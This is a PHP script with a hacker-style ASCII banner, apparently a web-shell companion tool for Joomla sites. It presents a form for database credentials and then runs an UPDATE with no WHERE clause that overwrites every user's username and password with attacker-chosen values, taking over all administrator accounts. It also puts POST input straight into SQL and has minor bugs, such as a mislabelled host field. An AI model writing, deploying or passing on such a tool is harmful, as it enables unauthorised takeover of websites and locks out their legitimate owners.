<?php

       #  ##### ##### ###      ### #   #         ###### #     #   #   ##     #  #####  #######  
       #  #   # #   # # #     #  # #  # #       #       #     #  # #  # #    # #       #
       #  #   # #   # #  #   #   # # #   #      #       ####### #   # #  #   # #       #######
       #  #   # #   # #   # #    # # #####      #       #     # ##### #   #  # # ##### #
       #  #   # #   # #    #     # # #   #      #       #     # #   # #    # # #     # #
     ##   ##### ##### #          # # #   #       ###### #     # #   # #     ##  #####  ####### 
	 
	 ####   #     #    ###         ###  ######        ###       ###  ####  ##      # ####### ####### ###### 
     #   #   #   #     #  #       #  #  #     #       # #       # # #    # # #     # #       #       #     #
	 #   #    # #      #   #     #   #  #     #       #  #     #  # #    # #  #    # #       #       #     #
	 ####      #       #    #   #    #  ######        #   #   #   # #    # #   #   # ####### ####### ######
	 #   #     #       #     # #     #  #     #       #    # #    # #    # #    #  # #       #       #     #
	 #   #     #       #      #      #  #      # ###  #     #     # #    # #     # # #       #       #      #
	 ####      #       #             #  #      # ###  #           #  ####  #      ## ####### ####### #      #
	 

 error_reporting(0);

echo  '<html>
   <head>
   <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
   <link rel="shortcut icon" href="http://store0.up-00.com/dl/46c42/Sicons-Basic-Round-Social-Joomla.ico" />
   <link href="http://fonts.googleapis.com/css?family=Orbitron:700" rel="stylesheet" type="text/css">
    <title> Change Password Admin Joomla   </title>  
	   <style>
    body {
	color:#80D713;
	background-color:#000000;
	}
    .input_mails {
	padding-left: 7px;
	padding-bottom: 3px;
	}
     table {
	 background: #111111;
     font-family: verdana;
     font-size: 15px;
	 background-color:
	 padding-left: 5px;
	 padding-bottom: 5px;
	 padding-top:5px;
	 }
	.btn {
	padding-top: 200px;
    padding-left: 130px;
	}
	.tdmsg {padding-top: 70px;}
	input {
	BORDER-RIGHT: #848482 1px solid;
    BORDER-TOP: #8A8B8A 1px solid;
    BORDER-LEFT: #757772 1px solid;
    BORDER-BOTTOM: #575455 1px solid;
    BACKGROUND-COLOR: #181818;
    font: 9pt tahoma;
    color: #ffffff;
     }
	textarea {
	BORDER-RIGHT: #848482 1px solid;
    BORDER-TOP: #8A8B8A 1px solid;
    BORDER-LEFT: #757772 1px solid;
    BORDER-BOTTOM: #575455 1px solid;
    BACKGROUND-COLOR: #181818;
    font: 9pt tahoma;
    color: #ffffff;
	}
	#submit {color: rgb(243, 11, 11);}
	h2 {  text-shadow: 0px 0px 5px  }
    h3 {  text-shadow: 0px 0px 5px  }
	.title {
     font-family:Orbitron;
    }
	.divbc{

        border-radius: 10px;
        border: 1px solid #45BD00;
        padding: 4px 2px;
        width: 35%;
        line-height: 24px;
        background: #111111;

      }
   .submitjoomla{
     margin-right:35px;
     margin-top:5px;
   }
	 </style>
	  </head>
	      <body>
		  <center><div class="divbc">
		<h3 class="title"> Change Password Admin Joomla  </h3>
		<h3 class="title">Coded By Mr.Moneer </h2>
		
	     
		 <form method="POST">
		  <table border="0">
		     <tr>  
		 <td>  DB Host    </td><td><input type="text" name="dbname" value="localhost"/></td>
		   </tr>
		   <tr>
		  <td> DB Name    </td><td><input type="text" name="dbname" /></td>
		   </tr>
		   <tr>
		  <td> DB User    </td><td><input type="text" name="dbuser" /></td>
		   </tr>
		   <tr>
		  <td> DB Pass    </td><td><input type="text" name="dbpass" /></td>
		   </tr>
		    <tr>
		  <td> DB Prefix    </td><td><input type="text" name="dbpre" value="jos_" /></td>
		   </tr>
		   <tr>
		  <td> Username   </td><td><input type="text" name="username" value="admin" /></td>
		   </tr>
		   <tr>
		 <td>  Password   </td><td><input type="text" name="password" value="moneer"/></td>
		   </tr>
		   
		   <tr>
		  <td> </td><td class="submitjoomla" > <input type="submit"  name="submit_Change" value="Change" /></td>
		   </tr>
		 </form>
		   </table></div></center>';
	
		   

		   if($_POST['submit_Change']){
		     
		   $dbhost = $_POST['dbhost'];
           $dbname = $_POST['dbname'];
           $dbuser = $_POST['dbuser'];
           $dbpass = $_POST['dbpass'];
           $dbpre = $_POST['dbpre'];
           $username = $_POST['username'];
           $password = md5($_POST['password']);
           
		   mysql_connect($dbhost,$dbuser,$dbpass) or die(mysql_error());
           mysql_select_db($dbname) or die(mysql_error());
		   
			     $sql = "UPDATE  ".$dbpre."users  SET `username` = '$username', `password` = '$password' ";
		         mysql_query($sql);
				 
				       if(mysql_query($sql) == 1){
				  
				        echo "<center><h4> Success :)</h4></center>"; 
				 
				      }else{
				      
					   echo "<center><h4 style='color:#F00;'> Error :( </h4></center>"; 
				      
				   }
		       
		   }
		    
		   
		   
		   
		   
		   
	?>
		   
		   
		   
</html>		   